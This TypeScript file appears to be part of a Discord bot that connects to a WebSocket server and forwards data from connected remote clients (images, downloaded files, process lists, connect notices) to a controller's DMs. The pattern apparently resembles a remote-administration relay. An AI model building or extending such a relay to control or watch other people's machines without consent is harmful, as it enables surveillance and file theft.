import type { DiscordClient } from "@/clients/DiscordClient";
import { Logger } from "@/shared/Logger";
import { type FileMulter } from "@/types/Multer";
import { Manager } from "socket.io-client";
import { AttachmentBuilder } from "discord.js";
import { type FileMulterWs, type Process } from "@/types/Ws";
import { fromBytesToMB } from "@/utils";

export interface Folders {
	files: DirEntry[];
}

interface DirEntry {
	/** The name of the entry (file name with extension or directory name). */
	name: string;
	/** Specifies whether this entry is a directory or not. */
	isDirectory: boolean;
	/** Specifies whether this entry is a file or not. */
	isFile: boolean;
	/** Specifies whether this entry is a symlink or not. */
	isSymlink: boolean;
}

export default class WsService {
	static async startWsServer(client: DiscordClient) {
		const manager = new Manager("wss://api.luqueee.dev", {
			autoConnect: true
		});

		const ws = manager.socket(`/bot`, {
			auth: {
				token: process.env.API_TOKEN
			}
		});

		manager.open((err) => {
			if (err) {
				Logger.error(`Error connecting to WebSocket server: ${err}`);
			} else {
				Logger.info("Connected to WebSocket server");
			}
		});

		ws.on("disconnectedClient", async (data: { controllerid: string; clientid: string }) => {
			const { controllerid, clientid } = data;

			Logger.info(`Client with ID: ${clientid} disconnected`);
			const owner = await client.users.fetch(controllerid);
			if (owner) {
				const embed = {
					title: "Client Disconnected",
					description: `A client has been disconnected from your session`,
					fields: [
						{
							name: "Client ID",
							value: clientid,
							inline: true
						}
					],
					color: 0xff0000,
					timestamp: new Date().toISOString()
				};

				await owner.send({ embeds: [embed] });
				Logger.info(`Client with ID: ${clientid} disconnected`);
			} else {
				Logger.warn(`Owner not found for ID: ${controllerid}`);
			}
		});

		ws.on("connectedClient", async (data: { controllerid: string; clientid: string }) => {
			const { controllerid, clientid } = data;

			Logger.info(`Client with ID: ${clientid} connected`);
			const owner = await client.users.fetch(controllerid);
			if (owner) {
				const embed = {
					title: "Client Connected",
					description: `A client has successfully connected `,
					fields: [
						{
							name: "Client ID",
							value: clientid,
							inline: true
						}
					],
					color: 0x00ff00,
					timestamp: new Date().toISOString()
				};

				await owner.send({ embeds: [embed] });
				Logger.info(`Client with ID: ${clientid} disconnected`);
			} else {
				Logger.warn(`Owner not found for ID: ${controllerid}`);
			}
		});

		ws.on("sendImageToController", async (data: FileMulterWs) => {
			const { controllerid, file } = data;

			const fileSize = (file.metadata.size / 1024 / 1024).toFixed(2);

			Logger.info(
				"Received image from client",
				JSON.stringify(file.metadata),
				"to controller",
				controllerid
			);

			const owner = await client.users.fetch(controllerid);
			if (owner) {
				try {
					const attachment = new AttachmentBuilder(Buffer.from(file.buffer), {
						name: file.metadata.filename
					});

					const embed = {
						title: "File Received",
						description: `**file name:** ${file.metadata.filename} \n **type:** ${file.metadata.format} \n**file size:** ${fileSize} MB`,

						color: 0x00ff00
					};

					await owner.send({
						content: `Image from: ${controllerid}`,
						embeds: [embed],
						files: [attachment]
					});
					Logger.info(`Image sent to owner with ID: ${controllerid}`);
				} catch (error) {
					Logger.error("Error sending image", error);
					await owner.send({
						content: `Error sending image from: ${controllerid}`
					});
				}
			} else {
				Logger.warn(`Owner not found for ID: ${controllerid}`);
			}
		});

		ws.on("downloadFile", async (data: { controllerid: string; file: FileMulter }) => {
			const { controllerid, file } = data;

			console.log(file);
			const fileSize = (file.size / 1024 / 1024).toFixed(2);

			const owner = await client.users.fetch(controllerid);
			Logger.info(
				"Test event received",
				owner,
				JSON.stringify({
					...file,
					buffer: []
				})
			);

			try {
				if (owner) {
					const attachment = new AttachmentBuilder(file.buffer, { name: file.originalname });
					const embed = {
						title: "File Received",
						description: `**file name:** ${file.originalname} \n **type:** ${file.mimetype} \n**file size:** ${fileSize} MB`,

						color: 0x00ff00
					};

					await owner.send({
						// content: `File from: ${controllerid}`,
						embeds: [embed],
						files: [attachment]
					});
					Logger.info(`File sent to owner with ID: ${controllerid}`);
				} else {
					Logger.warn(`Owner not found for ID: ${controllerid}`);
				}
			} catch (error) {
				Logger.error("Error sending file", error);
			}
		});

		ws.on("getTasksFromClient", async (data: { controllerid: string; tasks: Process[] }) => {
			const { tasks, controllerid } = data;

			const owner = await client.users.fetch(controllerid);
			Logger.info("Get task from client event received", owner);

			try {
				if (owner) {
					const chunkSize = 20;
					for (let i = 0; i < tasks.length; i += chunkSize) {
						const chunk = tasks.slice(i, i + chunkSize);
						const tasksEmbed = {
							title: `Process List (${i + 1}-${Math.min(i + chunkSize, tasks.length)} of ${tasks.length})`,
							description: chunk
								.map(
									(task) =>
										`**PID:** ${task.pid} - **Name:** ${task.name} - **Size:** ${fromBytesToMB(task.memory)} MB`
								)
								.join("\n"),
							color: 0x00ff00,
							timestamp: new Date().toISOString()
						};

						await owner.send({ embeds: [tasksEmbed] });
					}

					Logger.info(`Process list sent to owner with ID: ${controllerid}`);
				}
			} catch (error) {
				Logger.error("Error sending tasks", error);
			}
		});

		ws.on("close", () => {
			Logger.warn("Disconnected from WebSocket server");
		});

		return ws;
	}
}

// ws.on("test", async (data: { controllerid: string; message: string }) => {
// 	const { controllerid, message } = data;

// 	const guilds = client.guilds.cache.map((guild) => guild.id);
// 	const clients = [];
// 	for (const guildId of guilds) {
// 		const guild = await client.guilds.fetch(guildId);
// 		const members = await guild.members.fetch();
// 		clients.push(...members.map((member) => member.user));
// 	}

// 	Logger.info("Fetched all clients", clients);

// 	const owner = await client.users.fetch(controllerid);
// 	Logger.info("Test event received", JSON.stringify(data), owner);

// 	if (owner) {
// 		await owner.send(message);
// 		Logger.info(`Message sent to owner with ID: ${controllerid}`);
// 	} else {
// 		Logger.warn(`Owner not found for ID: ${controllerid}`);
// 	}
// });

// ws.on("message", async (content) => {
// 	Logger.info(`Received message from WebSocket server: ${content}`);

// 	const data = JSON.parse(content.toString()); // { serverId: 'ID_DEL_SERVIDOR', content: 'MENSAJE' }

// 	const {
// 		id: serverid,
// 		message
// 	}: {
// 		id: string;
// 		message: string;
// 	} = data;

// 	const decline = new ButtonBuilder()
// 		.setCustomId("decline")
// 		.setLabel("Decline")
// 		.setStyle(ButtonStyle.Danger);
// 	const accept = new ButtonBuilder()
// 		.setCustomId("accept")
// 		.setLabel("Accept")
// 		.setStyle(ButtonStyle.Success);

// 	const embed = new EmbedBuilder()
// 		.setAuthor({ name: "aaaa" })
// 		.setDescription("aaaaa")
// 		.setColor(0x23272a);
// 	const row = new ActionRowBuilder<ButtonBuilder>().addComponents(accept, decline);

// 	// Directly send the message to the appropriate channel
// 	const guild = client.guilds.cache.get(serverid);
// 	if (guild) {
// 		const channel = guild.channels.cache.get("1322962839803134200") as unknown as DMChannel;
// 		if (channel) {
// 			await channel.send({ components: [row], embeds: [embed] });
// 			Logger.info(`Message sent to channel: ${channel.id}`);
// 		} else {
// 			Logger.warn(`Channel not found for ID: 1322962839803134200`);
// 		}
// 	} else {
// 		Logger.warn(`Guild not found for ID: ${serverid}`);
// 	}
// });
